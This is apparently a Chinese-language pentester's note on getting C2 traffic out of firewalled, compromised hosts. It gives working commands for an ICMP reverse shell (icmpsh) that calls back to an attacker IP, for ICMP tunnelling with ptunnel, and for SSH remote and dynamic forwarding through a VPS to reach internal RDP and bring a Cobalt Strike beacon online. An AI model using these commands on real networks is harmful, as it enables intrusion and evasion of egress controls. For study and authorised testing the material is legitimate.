# 引言

在渗透时，上线c2的途径反向连接，和正向连接。目标机的位置可能在公网，也可能在内网，通过nat映射出来。
对于反向连接：
    当getshell后，发现该主机无法出网，即防火墙限制了出栈策略(限制端口，ip，协议)。这个时候反向shell会受限。
    比如限制端口tcp，反向连接c2的7001端口，但是目标出栈默认拒绝所有tcp连接，只放行必要的端口进行tcp连接(比如http，ssh等)，甚至关闭了所有tcp连接。这个时候就无法建立和7001的tcp连接，所有依赖tcp的协议都无法出网，比如cs常用的http。
* 处理方法
  限制端口，解决方法就是探测端口，看哪些可以通过。
  限制协议，方法就是建立隧道(将数据封装到其他协议)，就使用不依赖它的                   ()，同层(socket)或者更底层的协议(icmp网络层)
  限制ip，一般是白名单，这个情况基本无法解决，也有特殊的方法，域前置，利用可信平台(比如将评论作为payload存储点)
  对于正向连接：
    正向连接是安全设备主要的监听区域，如果反向连接实在无法建立，正向是无奈之策。
    使用正向连接，条件也很硬:要求可以直接访问到目标。
    比如:目标在内网，使用端口映射，80映射到内网某个ip的80，虽说能访问到，但是只有80端口。nc无法监听这个端口，当然也有办法:端口复用，80端口同时具备连接和web的任务，或者其他什么的方法(暂时想不到，可自行ai)

#### icmpsh
是跨平台工具反弹shell工具，python语言，无需管理员。
下载地址：[https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)
icmpsh是python2的，并且需要安装impacket这个包。推荐源码安装：
```python
python2 setup.py install  
#setup.py 是impacket包中的安装文件
```

因为icmpsh 是替代系统的ping命令的应答程序，需要先关闭本地的应答：
```bash
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```
```bash
#攻击机
python icmpsh_m.py 攻击者ip  受害者ip

#目标机
icmpsh.exe -t <攻击ip> -d 500 -b 30 -s 128
```

ptunnel使用方法：
```bash
-p 指定ICMP隧道另一端的IP
-lp：指定本地监听的端口
-da：指定要转发的目标机器的IP
-dp：指定要转发的目标机器的端口
-x：指定连接密码

攻击机：

ptunnle -x 123456
隧道两端就是 2337:攻击机----跳板机-->目标机:3389
注：这是网络层的隧道(icmp)，这个隧道没有端口一说，2337是监听用来封装其他流量的。在隧道的角色中，客户端(攻击机),服务端(跳板机)都没有隧道的端口。
```

## ssh隧道
隧道的原理：利用ssh的转发功能，和ssh本身的加密通信能力。
```
ssh 用户名@ip -p <端口号>

创建ssh隧道常用的参数有：
-C：压缩传输，提高传输速度
-f：将ssh传输转入后台执行，不占用当前的shell
-N：静默连接，连接后看不到具体会话
-g：允许远程主机连接本地用于转发的端口
-L：本地端口转发
-R：远程端口转发
-D：动态转发（SOCKS 代理）
-p：指定ssh端口
```

>本地转发

跳板机主动来连接，建立隧道。
利用的前提是已经拿到了明文密码。
```bash
攻击者：
ssh -CfNg -L [本地地址:]本地端口:目标地址:目标端口 user@跳板机

本地应用 → 本地SSH客户端监听端口 → (SSH加密) → 跳板机 → 目标
```

>远程转发

是主动去连接公网ip，建立双向连接
A(公网)-----B(跳板机)-----C(目标)
在B执行，通过ssh先让A监听一个端口，将这个端口给我(B)，然后我在转发到目标
```bash
B跳板机：
ssh -R [远端地址:]远端端口:目标地址:目标端口 user@远端
```
```
└─#ssh -R 2222:192.168.52.138:3389 root@10.10.10.173
173是vps，意思是将vps的2222端口流量通过自己发给内网138的3389端口。就可以通过vps:2222连接远程桌面。
```
上线cs
```
ssh -R 2222:local:3333 root@10.10.10.173
如果将192.168.52.138改为自己，也就是发给自己的3333端口，这样会建立双向隧道，内网机回连这个端口
```
两个监听器，一个用于接收数据，一个用于设置payload

>动态转发

上面的两种都是静态的，也就是转发的ip的端口都是固定的，都是转发到目标地址:目标端口。就像把ssh客户端变成了 socks 代理服务器。
```bash
ssh -D [本地地址:]本地端口 user@跳板机
```
